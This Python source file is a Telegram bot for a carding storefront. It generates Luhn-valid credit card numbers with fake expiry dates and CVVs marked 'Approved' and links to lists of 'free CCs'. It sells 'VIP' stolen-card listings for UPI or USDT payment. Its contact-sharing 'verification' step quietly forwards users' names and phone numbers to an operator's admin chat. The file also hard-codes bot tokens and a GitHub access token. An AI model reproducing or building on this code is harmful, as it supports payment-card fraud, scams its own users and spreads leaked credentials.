import random, json, io, logging, requests, asyncio
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ---------------- CONFIG ----------------
BOT_TOKEN = "8241360344:AAFP0_43PmJRCTa2mpv5F2q_XYixkRXTdYs"
ADMIN_BOT_TOKEN = "7636476146:AAFl2JDniUNsQYRFsU6BSHPVyS8sqQn0ejg"
ADMIN_CHAT_ID = 6800292901

GIST_ID_TXN = "426a9400569f40b6f4d664b74801a78a"
GITHUB_PAT = ("github_pat_11BQYPIPI0boMKyo1ZCgKa_LMmfMm9vac"
              "bpv1upw9PQ1mT7l2DQ3r24JDeTOOz1o5ePTEH7RT4RE861P9f")
HEADERS = {"Authorization": f"token {GITHUB_PAT}"}
GIST_URL_TXN = f"https://api.github.com/gists/{GIST_ID_TXN}"

JOIN_CHANNEL = "https://t.me/fuckincarders"
SUPPORT_LINK = "https://t.me/alone120122"
UPI_ID = "withonly.vinay@axl"

user_states = {}
verified_users = set()
joined_users = set()
last_statuses = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------------- CC GENERATOR ----------------
class CCGenerator:
    BIN_DATA = {
        "4": {"brand": "Visa", "length": 16, "bank": "Chase", "country": "US"},
        "5": {"brand": "Mastercard", "length": 16, "bank": "Citi", "country": "US"},
        "3": {"brand": "Amex", "length": 15, "bank": "Amex Bank", "country": "US"}
    }

    def get_bin_info(self, bin_number):
        return self.BIN_DATA.get(bin_number[0], {"brand":"Unknown","length":16,"bank":"Unknown","country":"US"})

    def luhn_checksum(self, number):
        digits = [int(d) for d in str(number)]
        odd, even = digits[-1::-2], digits[-2::-2]
        checksum = sum(odd)
        for d in even: checksum += sum([int(x) for x in str(d*2)])
        return checksum % 10

    def calculate_luhn(self, partial):
        c = self.luhn_checksum(int(partial)*10)
        return 0 if c==0 else 10-c

    def generate_card(self, bin_number):
        info = self.get_bin_info(bin_number)
        length = info["length"]
        need = length - len(bin_number) - 1
        acc = "".join([str(random.randint(0,9)) for _ in range(need)])
        partial = bin_number + acc
        check = self.calculate_luhn(partial)
        card_number = partial + str(check)
        exp = f"{random.randint(1,12):02d}/{str(random.randint(25,30))}"
        cvv = str(random.randint(100,999)) if info["brand"]!="Amex" else str(random.randint(1000,9999))
        return (f"💳 CC: {card_number}|{exp}|{cvv}\n"
                f"🏦 Bank: {info['bank']}\n"
                f"🌍 Country: {info['country']}\n"
                f"💠 Brand: {info['brand']}\n"
                f"📌 BIN: {bin_number}\n"
                f"✅ Status: Approved\n")

generator = CCGenerator()

# ---------------- TRANSACTIONS ----------------
def load_transactions():
    try:
        r = requests.get(GIST_URL_TXN, headers=HEADERS).json()
        files = r.get("files", {})
        content = files.get("transactions.json", {}).get("content", "{}")
        return json.loads(content)
    except:
        return {}

def save_transactions(data):
    payload = {"files": {"transactions.json":{"content": json.dumps(data, indent=2)}}}
    requests.patch(GIST_URL_TXN, headers=HEADERS, json=payload)

# ---------------- VERIFICATION ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in joined_users:
        keyboard = [[InlineKeyboardButton("✅ I have joined", callback_data="joined_channel")]]
        await update.message.reply_text(
            f"🚨 Please join our channel first:\n{JOIN_CHANNEL}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    if user_id not in verified_users:
        keyboard = [[InlineKeyboardButton("Verify", callback_data="verify_user")]]
        await update.message.reply_text(
            "🔒 Please verify your account to continue:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    await send_dashboard(update, context)

# ---------------- BUTTON HANDLERS ----------------
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "joined_channel":
        joined_users.add(user_id)
        keyboard = [[InlineKeyboardButton("Verify", callback_data="verify_user")]]
        await query.message.reply_text("🔒 Please verify your account to continue:",
                                       reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "verify_user":
        button = [[KeyboardButton("📱 Verify", request_contact=True)]]
        await query.message.reply_text(
            "Please verify yourself to continue:",
            reply_markup=ReplyKeyboardMarkup(button, one_time_keyboard=True, resize_keyboard=True)
        )
        return

    # Free CCs
    if data == "free_cc":
        keyboard = [
            [InlineKeyboardButton("💳 Visa", url="https://dark-2009.github.io/CC-Bot/Visa.txt")],
            [InlineKeyboardButton("💳 Mastercard", url="https://dark-2009.github.io/CC-Bot/Mastercard.txt")],
            [InlineKeyboardButton("💳 Amex", url="https://dark-2009.github.io/CC-Bot/Amex.txt")],
            [InlineKeyboardButton("◀️ Back", callback_data="back_home")]
        ]
        await query.message.reply_text("Choose Free CCs:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    # CC-GEN
    if data == "ccgen":
        keyboard = [
            [InlineKeyboardButton("📂 Upload BIN file", callback_data="upload_bin")],
            [InlineKeyboardButton("⌨️ Manual BIN", callback_data="manual_bin")],
            [InlineKeyboardButton("◀️ Back", callback_data="back_home")]
        ]
        await query.message.reply_text("Select BIN input method:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "upload_bin":
        user_states[user_id] = {"awaiting": "file"}
        await query.message.reply_text("Send me your BIN file (.txt)")
        return

    if data == "manual_bin":
        user_states[user_id] = {"awaiting": "bin"}
        await query.message.reply_text("Enter your BIN manually (6-9 digits)")
        return

    if data.startswith("choose_brand_"):
        brand = data.split("_")[-1]
        user_states[user_id]["brand"] = brand
        user_states[user_id]["awaiting"] = "qty"
        keyboard = [
            [InlineKeyboardButton("5", callback_data="qty_5"),
             InlineKeyboardButton("10", callback_data="qty_10")],
            [InlineKeyboardButton("20", callback_data="qty_20"),
             InlineKeyboardButton("50", callback_data="qty_50")],
            [InlineKeyboardButton("100", callback_data="qty_100")],
        ]
        await query.message.reply_text("Select how many CCs to generate:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith("qty_") and user_states.get(user_id, {}).get("awaiting") == "qty":
        qty = int(data.split("_")[1])
        bins = user_states[user_id].get("bins", [])
        brand = user_states[user_id].get("brand")
        results = []
        for b in bins:
            info = generator.get_bin_info(b)
            if brand and info["brand"].lower() != brand:
                continue
            for _ in range(qty):
                results.append(generator.generate_card(b))
        text = "\n".join(results)
        if len(text) > 4000:
            bio = io.BytesIO(text.encode())
            bio.name = "ccgen.txt"
            await query.message.reply_document(bio)
        else:
            await query.message.reply_text(text)
        user_states.pop(user_id, None)
        return

    # VIP CCs
    if data == "vip_menu":
        vip_text = """
🌟 VIP CCs 🌟

💎 Very Premium
- Amex Platinum: $22
- Visa Gold: $20
- Amex Gold: $20
- Mastercard Platinum: $18

✨ Good Category
- Mastercard: $10
- Visa: $10
- Amex: $10
"""
        keyboard = [
            [InlineKeyboardButton("Amex Platinum $22", callback_data="vip_22")],
            [InlineKeyboardButton("Visa Gold $20", callback_data="vip_20")],
            [InlineKeyboardButton("Amex Gold $20", callback_data="vip_20")],
            [InlineKeyboardButton("Mastercard Platinum $18", callback_data="vip_18")],
            [InlineKeyboardButton("Mastercard $10", callback_data="vip_10")],
            [InlineKeyboardButton("Visa $10", callback_data="vip_10")],
            [InlineKeyboardButton("Amex $10", callback_data="vip_10")],
            [InlineKeyboardButton("◀️ Back", callback_data="back_home")]
        ]
        await query.message.reply_text(vip_text, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith("vip_"):
        price = data.split("_")[1]
        user_states[user_id] = {"awaiting": "payment", "price": price}
        keyboard = [
            [InlineKeyboardButton("💵 UPI (India)", callback_data="pay_upi")],
            [InlineKeyboardButton("🌐 Crypto (International)", callback_data="pay_crypto")],
            [InlineKeyboardButton("◀️ Back", callback_data="back_home")]
        ]
        await query.message.reply_text(f"Choose payment method for ${price}:", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data == "pay_upi":
        price = user_states[user_id]["price"]
        kb = ReplyKeyboardMarkup([["✅ Paid", "◀️ Cancel"]], resize_keyboard=True)
        user_states[user_id]["awaiting"] = "utr"
        await query.message.reply_text(f"Send ₹{price} to UPI: {UPI_ID}\nThen click ✅ Paid.", reply_markup=kb)
        return

    if data == "pay_crypto":
        price = user_states[user_id]["price"]
        text = f"""Send ${price} to any of the USDT addresses:

ERC-20: 0x7AF25Fa408a2f4152b2450535Ea7Ce13520b7A37  

TRC-20: TGUSsmMDg2Dgn9zgSKeyPoQEmj9vMes6GV  

BEP-20: 0x7AF25Fa408a2f4152b2450535Ea7Ce13520b7A37  

SPL: UQFS1UuLrpVQBfo78a8nFQCzwEK7X6QipNXw1SVciQk
"""
        kb = ReplyKeyboardMarkup([["✅ Paid", "◀️ Cancel"]], resize_keyboard=True)
        user_states[user_id]["awaiting"] = "txhash"
        await query.message.reply_text(text, reply_markup=kb)
        return

    if data == "back_home":
        await send_dashboard(query, context)
        return

    if data.startswith("check_"):
        tid = data.split("_", 1)[1]
        txns = load_transactions()
        status = txns.get(tid, {}).get("status", "pending")
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📩 Check Status", callback_data=f"check_{tid}")],
            [InlineKeyboardButton("🆘 Contact Support", url=SUPPORT_LINK)]
        ])
        await query.message.reply_text(f"Status for `{tid}`: **{status.upper()}**",
                                       parse_mode="Markdown", reply_markup=kb)

# ---------------- TEXT HANDLER ----------------
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    state = user_states.get(user_id, {})
    text = update.message.text.strip()

    if text == "◀️ Cancel":
        user_states.pop(user_id, None)
        await update.message.reply_text("❌ Cancelled.", reply_markup=ReplyKeyboardRemove())
        await send_dashboard(update, context)
        return

    if text == "✅ Paid":
        if state.get("awaiting") == "utr":
            await update.message.reply_text("Please enter your UTR number:", reply_markup=ReplyKeyboardRemove())
            user_states[user_id]["awaiting"] = "utr_value"
            return
        elif state.get("awaiting") == "txhash":
            await update.message.reply_text("Please enter your Tx Hash:", reply_markup=ReplyKeyboardRemove())
            user_states[user_id]["awaiting"] = "txhash_value"
            return

    if state.get("awaiting") == "utr_value":
        utr = text
        txns = load_transactions()
        txns[utr] = {"user_id": user_id, "status": "pending"}
        save_transactions(txns)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📩 Check Status", callback_data=f"check_{utr}")],
            [InlineKeyboardButton("🆘 Contact Support", url=SUPPORT_LINK)]
        ])
        await update.message.reply_text(f"✅ UTR `{utr}` submitted.", parse_mode="Markdown", reply_markup=kb)
        user_states.pop(user_id, None)
        return

    if state.get("awaiting") == "txhash_value":
        tx = text
        txns = load_transactions()
        txns[tx] = {"user_id": user_id, "status": "pending"}
        save_transactions(txns)
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📩 Check Status", callback_data=f"check_{tx}")],
            [InlineKeyboardButton("🆘 Contact Support", url=SUPPORT_LINK)]
        ])
        await update.message.reply_text(f"✅ Tx Hash `{tx}` submitted.", parse_mode="Markdown", reply_markup=kb)
        user_states.pop(user_id, None)
        return

# ---------------- CONTACT ----------------
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    contact = update.message.contact
    if not contact:
        return
    verified_users.add(user.id)

    details = (f"👤 Name: {user.full_name}\n"
               f"📱 Number: {contact.phone_number}\n"
               f"🆔 User ID: {user.id}")

    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": details}
        )
    except Exception as e:
        logger.error(f"Admin notify failed: {e}")

    await update.message.reply_text(
        "✅ Verification successful!",
        reply_markup=ReplyKeyboardMarkup([["🏠 Dashboard"]], resize_keyboard=True)
    )
    await send_dashboard(update, context)

# ---------------- DASHBOARD ----------------
async def send_dashboard(update, context):
    keyboard = [
        [InlineKeyboardButton("💳 Free CCs", callback_data="free_cc")],
        [InlineKeyboardButton("⚡ CC-GEN", callback_data="ccgen")],
        [InlineKeyboardButton("🌟 VIP CCs", callback_data="vip_menu")]
    ]
    if hasattr(update, "callback_query"):
        await update.callback_query.message.reply_text("🏠 Dashboard:", reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text("🏠 Dashboard:", reply_markup=InlineKeyboardMarkup(keyboard))

# ---------------- NOTIFIER ----------------
async def notifier(app: Application):
    global last_statuses
    while True:
        txns = load_transactions()
        for tid, info in txns.items():
            uid = info.get("user_id")
            status = info.get("status")
            if not uid: continue
            if last_statuses.get(tid) != status and status in ["approved","rejected"]:
                try:
                    await app.bot.send_message(uid, f"🔔 Your transaction `{tid}` has been **{status.upper()}**.",
                                               parse_mode="Markdown")
                except Exception as e:
                    logger.error(f"Notify failed: {e}")
            last_statuses[tid] = status
        await asyncio.sleep(60)

# ---------------- MAIN ----------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("Dashboard", send_dashboard))
    app.add_handler(CallbackQueryHandler(handle_buttons))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    async def on_startup(app: Application):
        app.create_task(notifier(app))

    app.post_init = on_startup
    app.run_polling()

if __name__ == "__main__":
    main()
